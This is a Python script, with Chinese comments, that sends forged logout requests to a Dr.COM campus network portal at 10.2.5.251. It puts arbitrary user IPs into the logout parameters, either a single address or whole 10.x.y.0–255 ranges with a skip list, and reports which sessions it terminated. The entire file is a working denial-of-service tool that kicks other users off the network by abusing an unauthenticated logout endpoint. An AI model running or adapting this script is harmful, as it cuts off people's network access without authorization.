import requests
import time

# 定义ANSI转义序列颜色代码
COLOR_RED = '\033[91m'
COLOR_BLUE = '\033[94m'
COLOR_RESET = '\033[0m'

# 发送HTTP GET请求的函数
def send_get_request(wlan_user_ip):
    # 目标URL和参数
    url = 'http://10.2.5.251:801/eportal/?c=Portal&a=logout'
    params = {
        'callback': 'dr1715444712472',
        'login_method': '1',
        'user_account': 'drcom',
        'user_password': '123',
        'ac_logout': '0',
        'wlan_user_ip': wlan_user_ip,
        'wlan_user_ipv6': '',
        'wlan_vlan_id': '0',
        'wlan_user_mac': '000000000000',
        'wlan_ac_ip': '',
        'wlan_ac_name': '',
        'jsVersion': '3.0',
        '_': '1715444690415'
    }

    # 自定义请求头
    headers = {
        'Host': '10.2.5.251:801',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36',
        'Accept': '*/*',
        'Referer': 'http://10.2.5.251/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cookie': 'PHPSESSID=eplg77d3o1d5hn24i73bli6nm6',
        'Connection': 'close'
    }

    # 发送请求并获取响应
    response = requests.get(url, headers=headers, params=params)

    # 解码响应内容为字符串
    response_text = response.content.decode('utf-8')

    # 检查响应内容，判断IP是否存在
    if '注销成功' in response_text:
        # 以蓝色打印存在的IP地址
        print(COLOR_BLUE + f'IP {wlan_user_ip} 注销成功' + COLOR_RESET)
    elif '注销失败' in response_text:
        # 以红色打印不存在的IP地址
        print(COLOR_RED + f'IP {wlan_user_ip} 注销失败' + COLOR_RESET)
    else:
        print(f'Request sent with IP: {wlan_user_ip}')

    # 等待0.1秒
    time.sleep(0.1)

# 主函数
def main():
    print("请选择操作：")
    print("1. 遍历IP地址段")
    print("2. 输入单独IP地址")
    choice = input("请输入选项编号（1或2）: ")

    if choice == '1':
        # 获取用户输入的第二个和第三个IP段范围
        second_octet_start = int(input("请输入第二个IP段起始值（例如4）: "))
        second_octet_end = int(input("请输入第二个IP段结束值（例如5）: "))
        third_octet_start = int(input("请输入第三个IP段起始值（例如100）: "))
        third_octet_end = int(input("请输入第三个IP段结束值（例如105）: "))

        # 获取用户输入的需要跳过的IP地址列表
        skip_ips = input("请输入需要跳过的IP地址，多个IP地址请用逗号分隔（例如10.4.66.91,10.4.65.142）: ").split(',')
        skip_ips = [ip.strip() for ip in skip_ips]  # 去除空格

        # 遍历IP地址范围，跳过用户指定的IP地址
        for second_octet in range(second_octet_start, second_octet_end + 1):
            for third_octet in range(third_octet_start, third_octet_end + 1):
                for fourth_octet in range(256):
                    wlan_user_ip = f'10.{second_octet}.{third_octet}.{fourth_octet}'
                    # 检查是否为需要跳过的IP地址
                    if wlan_user_ip in skip_ips:
                        continue
                    send_get_request(wlan_user_ip)

    elif choice == '2':
        # 获取用户输入的单独IP地址进行注销
        single_ip = input("请输入一个单独的IP地址进行注销（例如10.4.100.1）: ")
        send_get_request(single_ip)

    else:
        print("无效的选项，请重新运行程序并选择1或2。")

# 运行主函数
if __name__ == "__main__":
    main()
